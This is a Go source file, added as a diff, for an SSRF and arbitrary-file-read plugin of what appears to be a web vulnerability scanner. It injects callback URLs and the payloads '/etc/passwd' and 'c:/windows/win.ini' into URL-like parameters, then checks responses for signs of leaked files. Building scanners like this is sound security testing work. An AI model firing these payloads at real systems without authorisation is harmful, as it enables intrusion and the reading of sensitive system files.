@@ -1,0 +1,120 @@
+package ssrf
+
+import (
+	"github.com/thoas/go-funk"
+	"github.com/yhy0/Jie/logging"
+	"github.com/yhy0/Jie/pkg/input"
+	"github.com/yhy0/Jie/pkg/output"
+	"github.com/yhy0/Jie/pkg/protocols/http"
+	"github.com/yhy0/Jie/pkg/reverse"
+	"github.com/yhy0/Jie/pkg/util"
+	"time"
+)
+
+/**
+  @author: yhy
+  @since: 2023/1/30
+  @desc: //TODO
+**/
+
+// 参数中包含以下关键字的，进行 ssrf 测试
+var sensitiveWords = []string{"url", "path", "uri", "api", "target", "host", "domain", "ip", "file"}
+
+func Scan(in *input.Input) {
+	params, err := http.ParseUri(in.Url, []byte(in.Body), in.Method, in.ContentType, in.Headers)
+	if err != nil {
+		logging.Logger.Debug(err.Error())
+		return
+	}
+
+	var ssrfHost string
+	var dnslog *reverse.Reverse
+	if in.IsSensorServerEnabled {
+		flag := util.RandLowLetterNumber(8)
+		dnslog = reverse.New("", flag)
+		ssrfHost = dnslog.Url
+	} else {
+		ssrfHost = "https://www.baidu.com/"
+	}
+
+	if ssrf(in, params.SetPayload(in.Url, ssrfHost, in.Method, sensitiveWords), dnslog) {
+		return
+	}
+
+	payloads := params.SetPayload(in.Url, "/etc/passwd", in.Method, sensitiveWords)
+	payloads = append(payloads, params.SetPayload(in.Url, "c:/windows/win.ini", in.Method, sensitiveWords)...)
+	readFile(in, payloads)
+}
+
+// ssrf
+func ssrf(in *input.Input, payloads []string, dnslog *reverse.Reverse) bool {
+	for _, payload := range payloads {
+		res, err := http.Request(in.Url, payload, in.Method, false, in.Headers)
+		if err != nil {
+			logging.Logger.Errorln(err)
+			continue
+		}
+
+		isVul := false
+		if in.IsSensorServerEnabled {
+			isVul = reverse.Check(dnslog, 5)
+		} else {
+			isVul = funk.Contains(res.Body, "www.baidu.com/img/sug_bd.png")
+		}
+
+		if isVul {
+			output.OutChannel <- output.VulMessage{
+				DataType: "web_vul",
+				Plugin:   "SSRF",
+				VulData: output.VulData{
+					CreateTime: time.Now().Format("2006-01-02 15:04:05"),
+					Target:     in.Url,
+					Method:     in.Method,
+					Ip:         in.Ip,
+					Param:      in.Kv,
+					Request:    res.RequestDump,
+					Response:   res.ResponseDump,
+					Payload:    payload,
+				},
+				Level: output.Critical,
+			}
+			return true
+		}
+
+	}
+
+	logging.Logger.Debugf("ssrf vulnerability not found")
+	return false
+}
+
+// readFile 任意文件读取
+func readFile(in *input.Input, payloads []string) {
+	for _, payload := range payloads {
+		res, err := http.Request(in.Url, payload, in.Method, false, in.Headers)
+		if err != nil {
+			logging.Logger.Errorln(err)
+			continue
+		}
+		if funk.Contains(res.Body, "root:x:0:0:root:/root:") || funk.Contains(res.Body, "root:[x*]:0:0:") || funk.Contains(res.Body, "; for 16-bit app support") {
+			output.OutChannel <- output.VulMessage{
+				DataType: "web_vul",
+				Plugin:   "READ-FILE",
+				VulData: output.VulData{
+					CreateTime: time.Now().Format("2006-01-02 15:04:05"),
+					Target:     in.Url,
+					Method:     in.Method,
+					Ip:         in.Ip,
+					Param:      in.Kv,
+					Request:    res.RequestDump,
+					Response:   res.ResponseDump,
+					Payload:    payload,
+				},
+				Level: output.Critical,
+			}
+			return
+		}
+
+	}
+
+	logging.Logger.Debugf("read file vulnerability not found")
+}
